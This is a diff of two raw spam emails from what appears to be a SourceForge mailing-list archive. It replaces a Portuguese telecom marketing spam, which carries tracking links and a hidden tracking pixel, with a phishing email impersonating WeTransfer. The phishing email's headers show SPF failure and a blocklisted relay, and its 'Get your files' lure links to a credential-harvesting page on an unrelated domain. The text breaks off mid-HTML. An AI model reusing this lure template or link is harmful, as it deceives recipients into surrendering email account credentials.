@@ -2,74 +2,70 @@ Return-Path: <osst-users-bounces@lists.sourceforge.net>
 X-Original-To: lists+osst-users@lfdr.de
 Delivered-To: lists+osst-users@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 50B5B131E3E
-	for <lists+osst-users@lfdr.de>; Tue,  7 Jan 2020 05:08:33 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 4E418138946
+	for <lists+osst-users@lfdr.de>; Mon, 13 Jan 2020 02:34:38 +0100 (CET)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
+	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:Message-ID:
+	Date:To:MIME-Version:Sender:Cc:Content-Transfer-Encoding:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Owner;
+	bh=FkG1+excxCSdMiuK9xjzFC8P4y1D8ajrc7VsJwMKodc=; b=SAmamrvcOUL3pUh1caclq3cJav
+	tP7jWvsuGlqPs2Fp9Bt3NBUL6FiqaPAB7O5Fp6rxG6/bX/gtYEz/ZJVLUdm+AA/cn58WCoX+07VXV
+	GIQVin0V4e4KQcK84Rk8cA0KTBY3J8I9TJHBHOUqM3kJHDgEQBL0z/EIxsKEwWwxy6O8=;
 Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
 	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
 	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
-	id 1iogAS-00019n-48
-	for lists+osst-users@lfdr.de; Tue, 07 Jan 2020 04:08:32 +0000
+	id 1iqocm-0006NP-Cl
+	for lists+osst-users@lfdr.de; Mon, 13 Jan 2020 01:34:36 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
  by sfs-ml-1.v29.lw.sourceforge.com with esmtps
  (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
- (envelope-from <email@onevpc.site>) id 1iogAQ-00019Y-IV
- for osst-users@lists.sourceforge.net; Tue, 07 Jan 2020 04:08:30 +0000
+ (envelope-from <noreply@wetransfer.com>) id 1iqock-0006NA-NR
+ for osst-users@lists.sourceforge.net; Mon, 13 Jan 2020 01:34:34 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Content-Type:Subject:Date:To:From:MIME-Version:
- Message-ID:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
+ d=sourceforge.net; s=x; h=Message-ID:Date:From:To:Subject:MIME-Version:
+ Content-Type:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=6J99+wptJm5JFzqDyuZqoB89sXmRps72b7gIg7oFmUY=; b=Zju6y9kxynr65RODdCE+JhoSID
- EAuclG88SdFVNL7xrtKN1hQP4tnrkJWVExJBoQJnqpXyLWMnT7LRgLZIbC4Wimr1mLcCjoZFsakyh
- NL51puqbiTmdJJB1hWLYeMuzQ5Y29x0rKeCkErSBn/vWzA3R53ULZbei+FfapGo7gs1w=;
+ bh=nQ5j0elfs6W+kNlKT+MB+7lVPwz4eJlfVjVuTR0XK5I=; b=BCycXZeNc18cD0K3+LyKJjKcta
+ 74k7lQ9r63oSABZKrSP8Oi/S6g1fKrcKg+zhLaiY19LCSSR13mczNgMgsXa3QFFBiNkCUvWui7aCb
+ h67K8dGrz105Z4DHA4FhRBrlwTBf3cp1FJngsubi7PHMmDsOR0eUZU2K+zuXM5fkPP+s=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Content-Type:Subject:Date:To:From:MIME-Version:Message-ID:Sender:Reply-To
+ h=Message-ID:Date:From:To:Subject:MIME-Version:Content-Type:Sender:Reply-To
  :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
  Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=6J99+wptJm5JFzqDyuZqoB89sXmRps72b7gIg7oFmUY=; b=g
- dEXC3R25Nq+GXNsRQ81+xsm81gX+zkIE38wbqhPqACt5Ek2rADeM3Vmai1faiu9lLQJqgAAc56mQZ
- 5S2+lq6hIAGweAcGmgGmthZ6I/hXS232cvRIf0N/4/SRqvAIdLdpAqkuHswEwnYPU2oCU/P+9TeTo
- 6lfvgL6+O4W2MQOY=;
-Received: from onevpc.site ([145.239.21.68])
- by sfi-mx-4.v28.lw.sourceforge.com with esmtps
- (TLSv1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.92.2)
- id 1iogAJ-00C8i7-DA
- for osst-users@lists.sourceforge.net; Tue, 07 Jan 2020 04:08:30 +0000
-dkim-signature: v=1; a=rsa-sha256; d=onevpc.site; s=dkim;
- c=relaxed/relaxed; q=dns/txt;
- h=From:Subject:Date:Message-ID:To:MIME-Version:Content-Type; 
- bh=6J99+wptJm5JFzqDyuZqoB89sXmRps72b7gIg7oFmUY=;
- b=fmUKJmdEY2y9sbQQzWzSt8m/ck8Nkqe7XtkQZNoql4jUuMOeRw+wnaKHmH6ey+KKlQEimTz8F9uoKIYjiR7zQSaPcuF5IQA/A/JbyjFEgzIRykFGfkPPsQQsSoywo7N/P0odj1cDw08czI6Kl3rgHImy6WKGm6wNlazAsvF/p2xop+8us6zNdUxAKshm4hnXXzJXBywAIMm2Wys9FNbca+NpqlI1Ye9RlI3Gs1da3WPwrvO3TMJcO4e8Mu
- FzOBy/lAufKs1TRkKwgcVsgZgT8R/9hvlLKcTgjUqVWTVjoMiTCf65bGZPt8NqQ5ZMxlhNuEOKcla/iGd2A/5aRKrviQ==
-Received: from WIN-SJIS0NFOLGS (WIN-SJIS0NFOLGS [127.0.0.1])
- by onevpc.site with ESMTPA ; Tue, 7 Jan 2020 01:08:10 -0300
-Message-ID: <d839cc7e-db20-48c2-a4b2-f053869e22b1@onevpc.site>
+ List-Owner:List-Archive; bh=nQ5j0elfs6W+kNlKT+MB+7lVPwz4eJlfVjVuTR0XK5I=; b=k
+ dojDhe0zfUnB/Jfl4N0YgjKhyomcB25tUHsiZXkuXEeYPokxIRt39jj8K39v1mxHgNvKLbBTe0+a9
+ fZVR24PwCrYCWc7Er2QKND/qisE4UAouSmf4Ld3r9q90gF/N+VUTCQZTUWUECicBemKiX0DeJVWna
+ ZQ5c04fPudm5Spro=;
+Received: from slot0.medixalsurg.ml ([85.204.116.235])
+ by sfi-mx-3.v28.lw.sourceforge.com with esmtps
+ (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
+ id 1iqocj-000SkI-A7
+ for osst-users@lists.sourceforge.net; Mon, 13 Jan 2020 01:34:34 +0000
 MIME-Version: 1.0
-From: "VIVO Empresas" <email@onevpc.site>
 To: osst-users@lists.sourceforge.net
-Date: 7 Jan 2020 01:08:10 -0300
-X-Spam-Score: 2.1 (++)
+Date: Sun, 12 Jan 2020 16:55:43 -0800
+Message-ID: <0.0.3.54F.1D5C9AC4E82AEEC.0@slot0.medixalsurg.ml>
+X-Spam-Score: 5.5 (+++++)
 X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
  See http://spamassassin.org/tag/ for more details.
- -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
- -0.0 SPF_PASS               SPF: sender matches SPF record
- 1.2 HTML_IMAGE_RATIO_04    BODY: HTML has a low ratio of text to image area
+ 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
+ [85.204.116.235 listed in zen.spamhaus.org]
+ 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
+ 0.9 SPF_FAIL               SPF: sender does not match SPF record (fail)
+ [SPF failed: Please see http://www.openspf.net/Why?s=mfrom;
+ id=noreply%40wetransfer.com; ip=85.204.116.235;
+ r=util-malware-1.v13.lw.sourceforge.com]
  1.0 HTML_MESSAGE           BODY: HTML included in message
- -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
- domain
- -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
- 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
- not necessarily valid
- 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
- See
- http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
- for more information. [URIs: smartvpc.online]
- 0.0 T_REMOTE_IMAGE         Message contains an external image
-X-Headers-End: 1iogAJ-00C8i7-DA
-Subject: [Osst-users] Link Dedicado VIVO
+ 0.0 AWL AWL: Adjusted score from AWL reputation of From: address
+X-Headers-End: 1iqocj-000SkI-A7
+Subject: [Osst-users] osst-users@lists.sourceforge.net Your files were sent
+ successfully
 X-BeenThere: osst-users@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -81,112 +77,423 @@ List-Post: <mailto:osst-users@lists.sourceforge.net>
 List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
  <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
-Content-Type: multipart/mixed; boundary="===============5065056908925239873=="
+From: WeTransfer via Osst-users <osst-users@lists.sourceforge.net>
+Reply-To: WeTransfer <noreply@wetransfer.com>
+Content-Type: multipart/mixed; boundary="===============3466196447267254775=="
 Errors-To: osst-users-bounces@lists.sourceforge.net
 
+You will not see this in a MIME-aware mail reader.
+--===============3466196447267254775==
+Content-Type: multipart/alternative; boundary="===============0857897956=="
 
---===============5065056908925239873==
-Content-Type: multipart/alternative;
- boundary=--boundary_77772_43d985b2-5764-49e5-b9e3-58326155caff
+You will not see this in a MIME-aware mail reader.
+--===============0857897956==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
 
+  =
 
-----boundary_77772_43d985b2-5764-49e5-b9e3-58326155caff
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: base64
+    =
 
-VklWTyBFbXByZXNhcyAvLy8vIExpbmsgRGVkaWNhZG8gVklWT3RhYmxlIHtib3JkZXIt
-c3BhY2luZzowOyBjb2xvcjojMDAwMDAwOyBmb250LWZhbWlseTpDYWxpYnJpLHNhbnMt
-c2VyaWY7IGJvcmRlci1jb2xsYXBzZTpjb2xsYXBzZSAhaW1wb3J0YW50O31pbWcge2Jv
-cmRlcjowOyBkaXNwbGF5OmJsb2NrO30gICAgICAgICAgICAgICAgICAgICAgICAgIEFC
-UklSIE5PIE5BVkVHQURPUiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRW52aWFk
-byBwYXJhOiAgICAgICAgIElkZW50aWZpY2HDp8OjbyBkZSBlbnZpbzogMDBbSWRdCQkg
-ICAgICAgIE7Do28gZGVzZWpvIG1haXMgcmVjZWJlciBlbWFpbHMgICAgICAgICAgICAg
-ICAgICAgICAgICA=
-----boundary_77772_43d985b2-5764-49e5-b9e3-58326155caff
-Content-Type: text/html; charset=utf-8
-Content-Transfer-Encoding: base64
+     =
 
-PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5WSVZPIEVtcHJlc2FzIC8vLy8gTGluayBEZWRp
-Y2FkbyBWSVZPPC90aXRsZT4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIg
-Y29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiPg0KPHN0eWxlIHR5
-cGU9InRleHQvY3NzIj4NCnRhYmxlIHtib3JkZXItc3BhY2luZzowOyBjb2xvcjojMDAw
-MDAwOyBmb250LWZhbWlseTpDYWxpYnJpLHNhbnMtc2VyaWY7IGJvcmRlci1jb2xsYXBz
-ZTpjb2xsYXBzZSAhaW1wb3J0YW50O30NCmltZyB7Ym9yZGVyOjA7IGRpc3BsYXk6Ymxv
-Y2s7fQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5IHN0eWxlPSJtYXJnaW46MDsgcGFk
-ZGluZzowOyBwYWRkaW5nLXRvcDowOyBwYWRkaW5nLWJvdHRvbTowOyBwYWRkaW5nLXJp
-Z2h0OjA7IHBhZGRpbmctbGVmdDowOyBtaW4td2lkdGg6MTAwJTsgZm9udC1mYW1pbHk6
-Q2FsaWJyaSxzYW5zLXNlcmlmOyBiYWNrZ3JvdW5kLWNvbG9yOiNmZmZmZmY7Ij4NCjxj
-ZW50ZXIgc3R5bGU9IndpZHRoOjEwMCU7IGJhY2tncm91bmQtY29sb3I6I2ZmZmZmZjsi
-Pg0KDQoNCjx0YWJsZSB3aWR0aD0iMTAwJSIgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFj
-aW5nPSIwIiBib3JkZXI9IjAiIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiNmZmZmZmY7
-IiBiZ2NvbG9yPSIjZmZmZmZmOyI+DQo8dHI+DQo8dGQgd2lkdGg9IjEwMCUiIHN0eWxl
-PSJwYWRkaW5nOjEwcHggMTBweCAxMHB4IDEwcHg7Ij4NCjxkaXYgc3R5bGU9Im1heC13
-aWR0aDo3MDBweDsgbWFyZ2luOjAgYXV0bzsiPiANCjwhLS1baWYgKGd0ZSBtc28gOSl8
-KElFKV0+DQo8dGFibGUgYWxpZ249ImNlbnRlciIgd2lkdGg9IjcwMCIgY2VsbHBhZGRp
-bmc9IjAiIGNlbGxzcGFjaW5nPSIwIiBib3JkZXI9IjAiIHN0eWxlPSJib3JkZXItc3Bh
-Y2luZzowIiA+DQo8dHI+DQo8dGQgc3R5bGU9InBhZGRpbmc6MDsgcGFkZGluZy10b3A6
-MDsgcGFkZGluZy1ib3R0b206MDsgcGFkZGluZy1yaWdodDowOyBwYWRkaW5nLWxlZnQ6
-MDsiPg0KPCFbZW5kaWZdLS0+IA0KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGNlbGxwYWRk
-aW5nPSIwIiBjZWxsc3BhY2luZz0iMCIgYm9yZGVyPSIwIiBzdHlsZT0iYm9yZGVyLXNw
-YWNpbmc6MDsgbWFyZ2luOjAgYXV0bzsgd2lkdGg6MTAwJTsgbWF4LXdpZHRoOjcwMHB4
-OyI+DQo8dHI+DQo8dGQgc3R5bGU9InBhZGRpbmctdG9wOjA7IHBhZGRpbmctYm90dG9t
-OjA7IHBhZGRpbmctcmlnaHQ6MDsgcGFkZGluZy1sZWZ0OjA7Ij4NCg0KDQoNCg0KPCEt
-LSBJTUcgLS0+DQoNCg0KICAgIDx0YWJsZSBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIw
-IiBjZWxsc3BhY2luZz0iMCIgd2lkdGg9IjEwMCUiPg0KICAgIDx0cj4NCiAgICA8dGQg
-YWxpZ249ImNlbnRlciI+DQogICAgDQogICAgICAgIDxhIGhyZWY9Imh0dHA6Ly9zbWFy
-dHZwYy5vbmxpbmUvbGluay9jL3Zpdm9hLz9MPTEmRT1vc3N0LXVzZXJzQGxpc3RzLnNv
-dXJjZWZvcmdlLm5ldCIgdGFyZ2V0PSJfYmxhbmsiIHN0eWxlPSJmb250LWZhbWlseTpD
-YWxpYnJpLHNhbnMtc2VyaWY7IGZvbnQtc2l6ZToxNHB4OyBjb2xvcjojMDAwMDAwOyI+
-QUJSSVIgTk8gTkFWRUdBRE9SPC9hPg0KICAgICAgICANCiAgICAgICAgPGEgaHJlZj0i
-aHR0cDovL3NtYXJ0dnBjLm9ubGluZS9saW5rL2Mvdml2b2EvP0w9MSZFPW9zc3QtdXNl
-cnNAbGlzdHMuc291cmNlZm9yZ2UubmV0IiB0YXJnZXQ9Il9ibGFuayI+DQogICAgICAg
-IDxpbWcgc3JjPSJodHRwOi8vc21hcnR2cGMub25saW5lL2ltZy92aXZvYTEuanBnIiBi
-b3JkZXI9IjAiIHdpZHRoPSIxMDAlIiBzdHlsZT0ibWF4LXdpZHRoOjcwMHB4OyBkaXNw
-bGF5OmJsb2NrOyIgYWx0PSIiPg0KICAgICAgICA8aW1nIHNyYz0iaHR0cDovL3NtYXJ0
-dnBjLm9ubGluZS9pbWcvdml2b2EyLmpwZyIgYm9yZGVyPSIwIiB3aWR0aD0iMTAwJSIg
-c3R5bGU9Im1heC13aWR0aDo3MDBweDsgZGlzcGxheTpibG9jazsiIGFsdD0iIj4NCiAg
-ICAgICAgPC9hPg0KICAgIA0KICAgIDwvdGQ+DQogICAgPC90cj4NCiAgICA8L3RhYmxl
-Pg0KDQoNCjwhLS0gRk9PVCAtLT4NCg0KDQogICAgPHRhYmxlIGJvcmRlcj0iMCIgY2Vs
-bHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIiB3aWR0aD0iMTAwJSI+DQogICAgPHRy
-Pg0KICAgIDx0ZCBhbGlnbj0iY2VudGVyIiBzdHlsZT0icGFkZGluZzoxMDBweCA0MHB4
-IDQwcHggNDBweDsiPg0KICAgIA0KICAgICAgICA8c3BhbiBzdHlsZT0iZm9udC1mYW1p
-bHk6Q2FsaWJyaSxzYW5zLXNlcmlmOyBmb250LXNpemU6MTRweDsgY29sb3I6IzAwMDAw
-MDsiPkVudmlhZG8gcGFyYTogb3NzdC11c2Vyc0BsaXN0cy5zb3VyY2Vmb3JnZS5uZXQ8
-L3NwYW4+DQogICAgICAgIDxicj48c3BhbiBzdHlsZT0iZm9udC1mYW1pbHk6Q2FsaWJy
-aSxzYW5zLXNlcmlmOyBmb250LXNpemU6MTRweDsgY29sb3I6IzAwMDAwMDsiPklkZW50
-aWZpY2HDp8OjbyBkZSBlbnZpbzogMDA3Nzc3Mjwvc3Bhbj4NCgkJPGJyPjxicj48YnI+
-PGEgaHJlZj0iaHR0cDovL3NtYXJ0dnBjLm9ubGluZS9saW5rL20vaW1kLz9FPW9zc3Qt
-dXNlcnNAbGlzdHMuc291cmNlZm9yZ2UubmV0IiB0YXJnZXQ9Il9ibGFuayI+PGltZyBi
-b3JkZXI9IjAiIHNyYz0iaHR0cDovL3NtYXJ0dnBjLm9ubGluZS9pbWcvbG9nby5naWYi
-IGFsdD0iSU1EIDc3NzcyIiBzdHlsZT0ibWF4LXdpZHRoOjIwMHB4OyBkaXNwbGF5OmJs
-b2NrOyI+PC9hPg0KICAgICAgICA8YnI+PGJyPjxhIGhyZWY9Imh0dHA6Ly9zbWFydHZw
-Yy5vbmxpbmUvcmVtb3Zlci8/RT1vc3N0LXVzZXJzQGxpc3RzLnNvdXJjZWZvcmdlLm5l
-dCIgdGFyZ2V0PSJfYmxhbmsiIHN0eWxlPSJmb250LWZhbWlseTpDYWxpYnJpLHNhbnMt
-c2VyaWY7IGZvbnQtc2l6ZToxNHB4OyBjb2xvcjojMDAwMDAwOyI+PHN0cm9uZz5Ow6Nv
-IGRlc2VqbyBtYWlzIHJlY2ViZXIgZW1haWxzPC9zdHJvbmc+PC9hPg0KICAgICAgICA8
-YnI+PGJyPjxicj48YnI+PGltZyBzcmM9Imh0dHA6Ly9zbWFydHZwYy5vbmxpbmUvcmVh
-ZC8/Qz12aXZvYSZFPW9zc3QtdXNlcnNAbGlzdHMuc291cmNlZm9yZ2UubmV0IiBib3Jk
-ZXI9IjAiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIGFsdD0iSU1EIDc3NzcyIiBzdHlsZT0i
-ZGlzcGxheTpibG9jazsiPg0KICAgIA0KICAgIDwvdGQ+DQogICAgPC90cj4NCiAgICA8
-L3RhYmxlPg0KDQoNCjwhLS0gRU5EIC0tPg0KDQoNCjwvdGQ+DQo8L3RyPg0KPC90YWJs
-ZT4NCjwhLS1baWYgKGd0ZSBtc28gOSl8KElFKV0+DQo8L3RkPg0KPC90cj4NCjwvdGFi
-bGU+DQo8IVtlbmRpZl0tLT4NCjwvZGl2Pg0KPC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0K
-DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4=
-----boundary_77772_43d985b2-5764-49e5-b9e3-58326155caff--
+    =
 
 
+  =
+
+   =
 
 
+ =
 
---===============5065056908925239873==
+    =
+
+    =
+
+   =
+
+You have received a files via WeTransfer
+  2 files, 20 MB in total. Will be deleted on 7th December, 2019
+   =
+
+   Get your files
+   =20
+
+--===============0857897956==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><div id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473=
+215_35469" style=3D"font-size: 16px; font-family: HelveticaNeue,&quot;Helve=
+tica =
+
+
+Neue&quot;,Helvetica,Arial,&quot;Lucida Grande&quot;,sans-serif; white-spac=
+e: normal; word-spacing: 0px; text-transform: none; =
+
+
+font-weight: 400; color: rgb(0, 0, 0); font-style: normal; text-align: cent=
+er; orphans: 2; widows: 2; letter-spacing: normal; =
+
+
+background-color: rgb(255, 255, 255); text-indent: 0px;">
+<div id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35468" =
+
+
+style=3D"text-align: center;">
+<table id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35467" class=3D"y=
+iv2956564175gmail-
+
+m_911891310866232251gmail-x_gmail-x_yiv6729642149x_table_full_width yiv2956=
+564175yahoo-compose-table-card" style=3D"margin: 0px =
+
+
+auto; padding: 0px; font-size: 13px; width: 600px; white-space: normal; wor=
+d-spacing: 0px; border-collapse: collapse; table-
+
+layout: fixed; text-transform: none; font-weight: 400; color: rgb(38, 40, 4=
+2); outline-width: medium; font-style: normal; text-
+
+align: left; outline-style: none; letter-spacing: normal; text-indent: 0px;=
+" border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
+<tbody =
+
+
+id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35466">
+<tr id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35465">
+<td =
+
+
+id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35464" class=3D"yiv29565=
+64175gmail-m_911891310866232251gmail-x_gmail-
+
+x_yiv6729642149x_logo_outer_wrapper_td" style=3D"margin: 0px; padding: 55px=
+ 0px 0px; font-family: arial,sans-serif; width: 600px; =
+
+
+outline-width: medium; outline-style: none;" align=3D"left" valign=3D"top">
+<table =
+
+
+id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35578" class=3D"yiv29565=
+64175gmail-m_911891310866232251gmail-x_gmail-
+
+x_yiv6729642149x_table_full_width yiv2956564175yahoo-compose-table-card" st=
+yle=3D"margin: 0px; padding: 0px; width: 600px; =
+
+
+border-collapse: collapse; table-layout: fixed; outline-width: medium; outl=
+ine-style: none;" border=3D"0" cellpadding=3D"0" =
+
+
+cellspacing=3D"0">
+<tbody id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35577">
+<tr =
+
+
+id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35576">
+<td id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35575" =
+
+
+class=3D"yiv2956564175gmail-m_911891310866232251gmail-x_gmail-x_yiv67296421=
+49x_logo_inner_wrapper_td" style=3D"margin: 0px; padding: =
+
+
+0px; font-size: 10px; font-family: arial,sans-serif; width: 600px; outline-=
+width: medium; outline-style: none;" align=3D"left" =
+
+
+bgcolor=3D"#409fff" valign=3D"top">
+<center id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35574">
+<table =
+
+
+class=3D"yiv2956564175gmail-m_911891310866232251gmail-x_gmail-x_yiv67296421=
+49x_table_centered yiv2956564175yahoo-compose-table-
+
+card" style=3D"margin: 0px auto; padding: 0px; width: auto; border-collapse=
+: collapse; table-layout: fixed; outline-width: medium; =
+
+
+outline-style: none;" align=3D"center" border=3D"0" cellpadding=3D"0" cells=
+pacing=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; padding: 0px; =
+
+
+font-family: arial,sans-serif; width: 56px; outline-width: medium; outline-=
+style: none; min-height: 16px;" align=3D"left" =
+
+
+height=3D"16" valign=3D"top"> <br></td></tr>
+<tr>
+<td style=3D"margin: 0px; padding: 0px; font-family: arial,sans-serif; widt=
+h: 56px; =
+
+
+outline-width: medium; outline-style: none;" align=3D"left" valign=3D"top">=
+<a style=3D"text-decoration: underline; color: rgb(25, 106, =
+
+
+212);" href=3D"http://fueledbygumbo.com/decent-ysgihs/revlutionary-autologs=
+/log404/stylesedited/try.php?
+
+main_domain=3Dmail.&amp;account=3D&amp;email&amp;" rel=3D"nofollow" target=
+=3D"_blank"><img class=3D"yiv2956564175gmail-
+
+m_911891310866232251gmail-x_gmail-x_yiv6729642149x_logo_white_img" style=3D=
+"margin: 0px; padding: 0px; width: 56px; outline-width: =
+
+
+medium; outline-style: none; display: block; line-height: 10px;" alt=3D"Cli=
+ck 'Download images' to view images" =
+
+
+src=3D"https://encrypted-tbn0.gstatic.com/images?q=3Dtbn:ANd9GcRlqia-bqB-aA=
+ynw2SvOlHGG5olxEcKEMZZ1YyIieZ7ww4We7cTFA" align=3D"middle" =
+
+
+border=3D"0" height=3D"30" width=3D"50"></a></td></tr>
+<tr>
+<td style=3D"margin: 0px; padding: 0px; font-family: arial,sans-serif; widt=
+h: =
+
+
+56px; outline-width: medium; outline-style: none; min-height: 11px;" align=
+=3D"left" height=3D"11" valign=3D"top"> =
+
+
+<br></td></tr></tbody></table></center></td></tr></tbody></table></td></tr>=
+</tbody></table>
+<table =
+
+
+id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35591" class=3D"yiv29565=
+64175gmail-m_911891310866232251gmail-x_gmail-
+
+x_yiv6729642149x_main_content_outer_wrapper_table yiv2956564175yahoo-compos=
+e-table-card" style=3D"margin: 0px auto; padding: 0px; =
+
+
+font-size: 13px; width: 600px; white-space: normal; word-spacing: 0px; bord=
+er-collapse: collapse; table-layout: fixed; text-
+
+transform: none; font-weight: 400; color: rgb(38, 40, 42); outline-width: m=
+edium; font-style: normal; text-align: left; =
+
+
+outline-style: none; letter-spacing: normal; background-color: rgb(255, 255=
+, 255); text-indent: 0px;" bgcolor=3D"#ffffff" =
+
+
+border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
+<tbody id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35590">
+<tr =
+
+
+id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35589">
+<td id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35588" =
+
+
+style=3D"margin: 0px; padding: 0px; font-family: arial,sans-serif; width: 6=
+00px; outline-width: medium; outline-style: none;" =
+
+
+align=3D"left" valign=3D"top">
+<table id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35587" class=3D"y=
+iv2956564175gmail-
+
+m_911891310866232251gmail-x_gmail-x_yiv6729642149x_table_full_width yiv2956=
+564175yahoo-compose-table-card" style=3D"margin: 0px; =
+
+
+padding: 0px; width: 600px; border-collapse: collapse; table-layout: fixed;=
+ outline-width: medium; outline-style: none;" =
+
+
+border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
+<tbody id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35586">
+<tr =
+
+
+id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35585">
+<td id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35584" =
+
+
+class=3D"yiv2956564175gmail-m_911891310866232251gmail-x_gmail-x_yiv67296421=
+49x_padded_mobile yiv2956564175gmail-
+
+m_911891310866232251gmail-x_gmail-x_yiv6729642149x_main_content_inner_wrapp=
+er_td" style=3D"margin: 0px; padding: 0px; font-family: =
+
+
+arial,sans-serif; width: 600px; outline-width: medium; outline-style: none;=
+" align=3D"left" valign=3D"top">
+<table =
+
+
+id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35583" class=3D"yiv29565=
+64175gmail-m_911891310866232251gmail-x_gmail-
+
+x_yiv6729642149x_table_full_width yiv2956564175yahoo-compose-table-card" st=
+yle=3D"margin: 0px; padding: 0px; width: 600px; =
+
+
+border-collapse: collapse; table-layout: fixed; outline-width: medium; outl=
+ine-style: none;" border=3D"0" cellpadding=3D"0" =
+
+
+cellspacing=3D"0">
+<tbody id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35582">
+<tr style=3D"font-size: 15px; color: rgb(33, 33, =
+
+
+33);">
+<td class=3D"yiv2956564175gmail-m_911891310866232251gmail-x_gmail-x_yiv6729=
+642149x_main_heading_td yiv2956564175gmail-
+
+m_911891310866232251gmail-x_gmail-x_yiv6729642149x_unpadded_mobile yiv29565=
+64175gmail-m_911891310866232251gmail-x_gmail-
+
+x_yiv6729642149x_main_heading_td_wider" style=3D"margin: 0px; padding: 60px=
+ 80px 0px; font-size: 26px; width: 440px; color: rgb
+
+(23, 24, 26); outline-width: medium; outline-style: none; line-height: 30px=
+;" align=3D"center" valign=3D"top"><span =
+
+
+class=3D"yiv2956564175gmail-m_911891310866232251gmail-x_gmail-x_yiv67296421=
